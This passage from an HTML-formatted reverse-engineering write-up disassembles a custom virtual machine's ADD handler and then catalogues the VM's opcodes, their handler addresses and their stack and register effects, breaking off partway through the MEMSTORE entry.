[rax]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014dc\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014e0\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8b4038         mov eax, dword [rax + 0x38]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014e3\u003C/span>\u003Cspan style=\"color:#79B8FF\">      4898\u003C/span>\u003Cspan style=\"color:#9ECBFF\">           cdqe\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014e5\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      48c1e002       shl rax, \u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014e9\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      4801d0         add rax, rdx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014ec\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8b00           mov eax, dword [rax]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014ee\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8945fc         mov dword [var_4h], eax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014f1\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014f5\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8b4038         mov eax, dword [rax + 0x38]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014f8\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8d50ff         lea edx, [rax - 1]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014fb\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014ff\u003C/span>\u003Cspan style=\"color:#79B8FF\">      895038\u003C/span>\u003Cspan style=\"color:#9ECBFF\">         mov dword [rax + 0x38], edx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001502\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001506\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b10         mov rdx, qword [rax]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001509\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000150d\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8b4038         mov eax, dword [rax + 0x38]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001510\u003C/span>\u003Cspan style=\"color:#79B8FF\">      4898\u003C/span>\u003Cspan style=\"color:#9ECBFF\">           cdqe\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001512\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      48c1e002       shl rax, \u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001516\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      4801d0         add rax, rdx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001519\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8b00           mov eax, dword [rax]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000151b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8945f8         mov dword [var_8h], eax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000151e\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001522\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8b4038         mov eax, dword [rax + 0x38]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001525\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8d50ff         lea edx, [rax - 1]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001528\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000152c\u003C/span>\u003Cspan style=\"color:#79B8FF\">      895038\u003C/span>\u003Cspan style=\"color:#9ECBFF\">         mov dword [rax + 0x38], edx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000152f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001533\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8b4038         mov eax, dword [rax + 0x38]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001536\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8d5001         lea edx, [rax + 1]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001539\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000153d\u003C/span>\u003Cspan style=\"color:#79B8FF\">      895038\u003C/span>\u003Cspan style=\"color:#9ECBFF\">         mov dword [rax + 0x38], edx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001540\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8b55fc         mov edx, dword [var_4h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001543\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8b45f8         mov eax, dword [var_8h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001546\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8d0c02         lea ecx, [rdx + rax]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001549\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000154d\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b10         mov rdx, qword [rax]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001550\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001554\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      8b4038         mov eax, dword [rax + 0x38]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001557\u003C/span>\u003Cspan style=\"color:#79B8FF\">      4898\u003C/span>\u003Cspan style=\"color:#9ECBFF\">           cdqe\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001559\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      48c1e002       shl rax, \u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000155d\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488d3402       lea rsi, [rdx + rax]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001561\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      4863d1         movsxd rdx, ecx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001564\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      4889d0         mov rax, rdx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001567\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      48c1e01e       shl rax, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x1e\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000156b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      4801d0         add rax, rdx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000156e\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      48c1e820       shr rax, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x20\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001572\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      89c2           mov edx, eax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001574\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      c1fa1d         sar edx, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x1d\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001577\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      89c8           mov eax, ecx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001579\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      c1f81f         sar eax, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x1f\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000157c\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      29c2           sub edx, eax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000157e\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      89d0           mov eax, edx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001580\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      89c2           mov edx, eax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001582\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      c1e21f         shl edx, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x1f\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001585\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      29c2           sub edx, eax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001587\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      89c8           mov eax, ecx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x00001589\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      29d0           sub eax, edx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000158b\u003C/span>\u003Cspan style=\"color:#79B8FF\">      8906\u003C/span>\u003Cspan style=\"color:#9ECBFF\">           mov dword [rsi], eax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000158d\u003C/span>\u003Cspan style=\"color:#79B8FF\">      90\u003C/span>\u003Cspan style=\"color:#9ECBFF\">             nop\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000158e\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      5d             pop rbp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">└\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x0000158f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      c3             ret\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This opcode handler implements the VM’s ADD instruction. It operates on the VM stack by popping two 32-bit values, decrementing the stack pointer accordingly. The two values are added together, and the resulting sum is reduced using a modulo operation with 0x7fffffff to constrain it within a fixed range.\u003C/p>\n\u003Cp>After identifying the VM structure, the next step is manually identifying each opcode handler (would not reccomend)\u003C/p>\n\u003Cp>We backtrack to the first opcode registration point:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">s \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x00001dde\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>MUL Opcode\u003C/p>\n\u003Cp>This instruction pops two values from the VM stack, multiplies them, applies modulo \u003Ccode>0x7fffffff\u003C/code>, and pushes the result back onto the stack.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-9.png\" alt=\"MUL\">\u003C/p>\n\u003Chr>\n\u003Cp>XOR Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0x48c5ccc6  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001438\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The XOR instruction pops two values from the stack, performs a bitwise XOR, and pushes the result back.\r\nUnlike other arithmetic operations, XOR does \u003Cstrong>not\u003C/strong> apply modulo.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-10.png\" alt=\"XOR\">\u003C/p>\n\u003Chr>\n\u003Cp>AND Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0x542010a0  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001590\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Performs bitwise AND between two stack values and pushes the result.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-11.png\" alt=\"AND\">\u003C/p>\n\u003Chr>\n\u003Cp>RET Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0xbdecfe55  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x000017bb\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Returns from a VM function by restoring the program counter from the Link Register (LR).\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-12.png\" alt=\"RET\">\u003C/p>\n\u003Chr>\n\u003Cp>ABORT Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0x41f93b4b  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x000017d4\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Immediately terminates execution by calling \u003Ccode>exit(1)\u003C/code>.\r\nUsed for invalid execution paths.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-13.png\" alt=\"ABORT\">\u003C/p>\n\u003Chr>\n\u003Cp>PUSH_IMM Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Handler: 0x000017ea\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Pushes a 32-bit immediate value (fetched from ROM) onto the VM stack.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-14.png\" alt=\"PUSH_IMM\">\u003C/p>\n\u003Chr>\n\u003Cp>JZ (Jump if Equal)\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0x180bc12d  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001866\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Pops two values from the stack.\r\nIf they are equal, the program counter is adjusted using a signed immediate offset.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-15.png\" alt=\"JZ\">\u003C/p>\n\u003Chr>\n\u003Cp>JNZ (Jump if Not Equal)\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0x5a0f38fc  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x000018f9\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Pops two values from the stack.\r\nIf they are \u003Cstrong>not\u003C/strong> equal, PC is updated by a signed immediate offset.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-16.png\" alt=\"JNZ\">\u003C/p>\n\u003Chr>\n\u003Cp>FAIL Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0x27497906  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x0000198c\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Another hard failure instruction that immediately exits the program.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-17.png\" alt=\"FAIL\">\u003C/p>\n\u003Chr>\n\u003Cp>SET_MEM_PTR Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0xba1116a9  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x000019a2\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Updates the VM memory pointer, used for subsequent memory read/write instructions.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-18.png\" alt=\"SET_MEMPTR\">\u003C/p>\n\u003Chr>\n\u003Cp>CALL Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0xfa83fa5e  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x000019de\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Stores the current PC into the Link Register (LR) and jumps to a new address.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-19.png\" alt=\"CALL\">\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"halt-opcode\">HALT Opcode\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0x818cd6b5  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001a1d\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Sets the exit code and terminates VM execution cleanly.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-20.png\" alt=\"HALT\">\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"load_reg-opcode\">LOAD_REG Opcode\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0x8d67bae1  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001a64\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Loads a 32-bit value from ROM into a register.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-21.png\" alt=\"LOAD_REG\">\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"putchar-opcode\">PUTCHAR Opcode\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Opcode: 0xd1450d67  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001abf\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Outputs a character using \u003Ccode>putchar()\u003C/code> and sets the VM \u003Ccode>PUT_FLAG\u003C/code>.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-22.png\" alt=\"PUTCHAR\">\u003C/p>\n\u003Chr>\n\u003Cp>INC / DEC Register Opcodes\u003C/p>\n\u003Cp>INC\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001b03\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-23.png\" alt=\"INC\">\u003C/p>\n\u003Cp>DEC\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001b46\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-24.png\" alt=\"DEC\">\u003C/p>\n\u003Chr>\n\u003Cp>MOD Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001724\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Performs modulo operation using a register and pushes the result onto the stack.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-25.png\" alt=\"MOD\">\u003C/p>\n\u003Chr>\n\u003Cp>POP_REG Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001be5\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Pops a value from the stack into a register.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-26.png\" alt=\"POP_REG\">\u003C/p>\n\u003Chr>\n\u003Cp>SET_MEM_PTR Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001c41\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Adjusts internal VM memory pointers.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-27.png\" alt=\"SET_MEM_PTR\">\u003C/p>\n\u003Chr>\n\u003Cp>MEMSTORE Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001ca4\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Stores a register value into VM memory at 